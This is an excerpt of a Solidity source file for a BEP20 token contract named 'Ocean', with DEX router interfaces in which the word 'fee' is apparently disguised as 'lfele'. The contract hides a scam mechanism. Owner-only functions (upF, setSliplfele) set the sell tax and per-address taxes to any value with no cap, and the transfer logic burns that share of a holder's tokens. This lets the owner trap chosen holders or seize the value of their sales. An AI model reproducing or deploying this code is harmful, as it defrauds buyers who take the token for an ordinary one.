...
interface IUniswapV2Factory {
    ...
    function lfeleTo() external view returns (address);
    function lfeleToSetter() external view returns (address);
    ...
    function setlfeleTo(address) external;
    function setlfeleToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinglfeleOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinglfeleOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinglfeleOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinglfeleOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinglfeleOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Ocean  is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSelllfele = 0;

    uint256 private _defaultBuylfele = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _sliplfele;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelllfele = _value;
    }

    function setSliplfele(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _sliplfele[_address] = _value;
    }

    function getSliplfele(address _address) external view onlyownar returns (uint256) {
        return _sliplfele[_address];
    }


    function setMAccountlfele(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountlfele(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradelfeleAmount = 0;

        if (rF) {
            uint256 tradelfele = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradelfele = _defaultSelllfele;
                }
                if (from == uniswapV2Pair) {

                    tradelfele = _defaultBuylfele;
                }
            }
            if (_sliplfele[from] > 0) {
                tradelfele = _sliplfele[from];
            }

            tradelfeleAmount = _Amount.mul(tradelfele).div(100);
        }


        if (tradelfeleAmount > 0) {
            _balances[from] = _balances[from].sub(tradelfeleAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradelfeleAmount);
            emit Transfer(from, _deadAddress, tradelfeleAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradelfeleAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradelfeleAmount);
        emit Transfer(from, _to, _Amount - tradelfeleAmount);
    }
